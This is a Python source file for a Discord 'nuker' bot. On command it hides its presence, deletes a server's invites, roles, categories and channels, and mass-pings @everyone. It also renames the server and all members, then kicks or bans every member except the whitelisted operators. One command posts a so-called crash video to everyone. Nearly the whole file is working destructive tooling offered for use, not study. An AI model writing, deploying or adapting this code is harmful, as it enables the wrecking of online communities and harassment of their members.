import discord
from colorama import Fore, Back, Style
import asyncio
import os

client = discord.Client(intents=discord.Intents.all())
atu = [123]  # <- IDS OF THE PERSONS WHO ARE ABLE TO USE HERE


@client.event
async def on_ready():
    await client.change_presence(status=discord.Status.invisible)
    print(Fore.LIGHTCYAN_EX + f'''  █████▒▒███████▒  █████▒    ███▄    █  █    ██  ██ ▄█▀▓█████  ██▀███  
▓██   ▒ ▒ ▒ ▒ ▄▀░▓██   ▒     ██ ▀█   █  ██  ▓██▒ ██▄█▒ ▓█   ▀ ▓██ ▒ ██▒
▒████ ░ ░ ▒ ▄▀▒░ ▒████ ░    ▓██  ▀█ ██▒▓██  ▒██░▓███▄░ ▒███   ▓██ ░▄█ ▒
░▓█▒  ░   ▄▀▒   ░░▓█▒  ░    ▓██▒  ▐▌██▒▓▓█  ░██░▓██ █▄ ▒▓█  ▄ ▒██▀▀█▄  
░▒█░    ▒███████▒░▒█░       ▒██░   ▓██░▒▒█████▓ ▒██▒ █▄░▒████▒░██▓ ▒██▒
 ▒ ░    ░▒▒ ▓░▒░▒ ▒ ░       ░ ▒░   ▒ ▒ ░▒▓▒ ▒ ▒ ▒ ▒▒ ▓▒░░ ▒░ ░░ ▒▓ ░▒▓░
 ░      ░░▒ ▒ ░ ▒ ░         ░ ░░   ░ ▒░░░▒░ ░ ░ ░ ░▒ ▒░ ░ ░  ░  ░▒ ░ ▒░
 ░ ░    ░ ░ ░ ░ ░ ░ ░          ░   ░ ░  ░░░ ░ ░ ░ ░░ ░    ░     ░░   ░ 
          ░ ░                        ░    ░     ░  ░      ░  ░   ░     
        ░                                                              ''' + Style.RESET_ALL)
    print(Fore.GREEN + "Ready for use " + Style.BRIGHT + Fore.LIGHTBLACK_EX + "|" + Fore.RED + Style.NORMAL +
          " CFT Development <3" + Style.RESET_ALL)


async def background(guild, message, aSc, aNick):
    for invite in await guild.invites():
        try:
            await invite.delete()
        except:
            await message.author.send(f"Cannot delete > {invite} | (INVITE)", delete_after=10)
    for role in guild.roles:
        try:
            await role.delete()
        except:
            await message.author.send(f"Cannot delete > {role.name} | (ROLE)", delete_after=10)
    if aSc:
        with open('404.png', 'rb') as f:
            srv_logo = f.read()
        await guild.edit(name="404", icon=srv_logo)
    if aNick:
        for member in message.guild.members:
            try:
                await member.edit(nick="404")
            except discord.Forbidden:
                await message.author.send(f"Cannot edit > {member.name}#{member.discriminator} | (USER)",
                                          delete_after=10)


async def foreground(guild, message):
    for cat in guild.categories:
        try:
            await cat.delete()
        except:
            await message.author.send(f"Cannot delete > {cat.name} | (CATEGORY)", delete_after=10)
    for chan in guild.channels:
        try:
            await chan.send("@everyone NUKE!")
            await chan.delete()
        except:
            await message.author.send(f"Cannot delete/send > {chan.name} | (CHANNEL)", delete_after=10)
    overwrites = {
        guild.default_role: discord.PermissionOverwrite(read_messages=True, send_messages=False)
    }
    channel = await guild.create_text_channel(name="404", topic="404 | I think this discord was nuked :/ | 404",
                                              overwrites=overwrites)
    await channel.send(f"{guild.owner.mention} is your discord fine?")
    for user in guild.members:
        try:
            if not int(user.id) in atu:
                await guild.ban(user, reason="404")
        except discord.Forbidden:
            await message.author.send(f"Cannot ban > {user.name}#{user.discriminator} | (USER)", delete_after=10)


@client.event
async def on_message(message):
    msg = message.content.casefold()
    if msg.startswith("!help"):
        await message.author.send(f"`!sc [name]` - Changes Server | You **can** upload a custom picture\n"
                                  f"`!nick [name]` - Nicks Every User\n"
                                  f"`!kickall` - Kicks Everyone\n"
                                  f"`!banall` - Bans Everyone\n"
                                  f"`!leave` - Bot Will Leave The Guild\n"
                                  f"`!meme` - Bot Will Send A Crash Video\n"
                                  f"`!cdms` - Bot Will Delete All His DMs\n"
                                  f"`!name-chans` - "
                                  f"`!nuke [sc] [nick]` - Does Everything |"
                                  f" `sc` and `nick` are bools (true or false)\n\n"
                                  f"*Default state of `sc` and `nick` is true | **None of all the args is important!***",
                                  delete_after=30)
        if message.guild:
            await message.delete()
    if msg.startswith("!sc"):
        if not message.guild:
            return await message.reply("This command only works on a guild!", delete_after=10)
        csl = False
        guild = message.guild
        name = " ".join(message.content.split(" ")[1:100])
        try:
            picture = message.attachments[0]
            await picture.save("srvlogo.png")
            with open('srvlogo.png', 'rb') as f:
                srv_logo = f.read()
            csl = True
        except IndexError:
            with open('404.png', 'rb') as f:
                srv_logo = f.read()
        await guild.edit(name="404" if name == "" else "{}".format(name), icon=srv_logo)
        if csl:
            os.remove("srvlogo.png")
        await message.delete()
    if msg.startswith("!nick"):
        if not message.guild:
            return await message.reply("This command only works on a guild!", delete_after=10)
        nick = " ".join(message.content.split(" ")[1:32])
        for member in message.guild.members:
            try:
                await member.edit(nick="404" if nick == "" else "{}".format(nick))
            except discord.Forbidden:
                await message.author.send(f"Cannot edit > {member.name}#{member.discriminator} | (USER)",
                                          delete_after=10)
        await message.delete()
    if msg.startswith("!nuke"):
        if not message.guild:
            return await message.reply("This command only works on a guild!", delete_after=10)
        guild = message.guild
        args = msg.split(" ")[1:2]
        try:
            if args[1] == "false":
                aSc = False
            else:
                aSc = True
            if args[2] == "false":
                aNick = False
            else:
                aNick = True
        except IndexError:
            aSc = True
            aNick = True
        asyncio.create_task(background(guild, message, aSc, aNick))
        asyncio.create_task(foreground(guild, message))
        bot_msg2 = await message.author.send("Wanna let the bot leave? (y/n)")
        try:
            usr_msg = await client.wait_for("message", check=lambda m: m.author == message.author and m.channel.id == message.channel.id,
                                            timeout=30)
            if usr_msg.content.casefold() in ("y", "yes", "ye"):
                guild.leave()
                await usr_msg.reply("Bot left!")
            else:
                await bot_msg2.delete()
                await usr_msg.reply("Bot didn't left!\n\n"
                                    "For manual execution do `!leave` on the guild!", delete_after=15)
        except asyncio.TimeoutError:
            await bot_msg2.delete()
            await message.author.send("Bot didn't left!\n\n"
                                      "For manual execution do `!leave` on the guild!", delete_after=15)
    if msg.startswith("!kickall"):
        if not message.guild:
            return await message.reply("This command only works on a guild!", delete_after=10)
        guild = message.guild
        for user in guild.members:
            try:
                if not int(user.id) in atu:
                    await user.kick(reason="404")
            except discord.Forbidden:
                await message.author.send(f"Cannot kick > {user.name}#{user.discriminator} | (USER)", delete_after=10)
        await message.delete()
    if msg.startswith("!name-chans"):
        if not message.guild:
            return await message.reply("This command only works on a guild!", delete_after=10)
        name = " ".join(message.content.split(" ")[1:100])
        for chan in message.guild.channels:
            try:
                chan.edit(name=str(name))
            except discord.Forbidden:
                await message.author.send(f"Cannot edit > {chan.name} | (CHANNEL)", delete_after=10)
        await message.delete()
    if msg.startswith("!banall"):
        if not message.guild:
            return await message.reply("This command only works on a guild!", delete_after=10)
        guild = message.guild
        for user in guild.members:
            try:
                if not int(user.id) in atu:
                    await guild.ban(user, reason="404")
            except discord.Forbidden:
                await message.author.send(f"Cannot ban > {user.name}#{user.discriminator} | (USER)", delete_after=10)
        await message.delete()
    if msg.startswith("!leave"):
        if not message.guild:
            return await message.reply("This command only works on a guild!", delete_after=10)
        guild = message.guild
        await message.delete()
        await guild.leave()
    if msg.startswith("!meme"):
        bot_msg = await message.reply("thinking...")
        await message.channel.send("@everyone Here is a funny minecraft video \\:D",
                                   file=discord.File(r'Minecraft_Meme.mp4'))
        await bot_msg.delete()
        if message.guild:
            await message.delete()
    if msg.startswith("!cdms"):
        async for dm_message in message.author.history(limit=None):
            if dm_message.author.id == client.user.id:
                await dm_message.delete()
        if message.guild:
            message.delete()


client.run("TOKEN")
